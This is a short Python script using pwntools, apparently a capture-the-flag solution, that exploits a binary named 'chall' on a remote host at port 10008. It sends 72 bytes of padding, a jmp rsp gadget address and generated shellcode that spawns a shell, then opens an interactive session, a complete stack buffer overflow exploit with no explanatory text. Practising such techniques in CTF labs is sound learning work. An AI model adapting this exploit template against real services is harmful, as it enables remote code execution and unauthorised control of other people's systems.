from pwn import *

context.binary = elf = ELF("./chall")
p = remote("134.112.58.12", 10008)

offset = 72
jmp_rsp = 0x4011d4

payload  = b"A" * offset
payload += p64(jmp_rsp)
payload += asm(shellcraft.sh())

p.sendlineafter(b"Enter the Inferno:", payload)
p.interactive()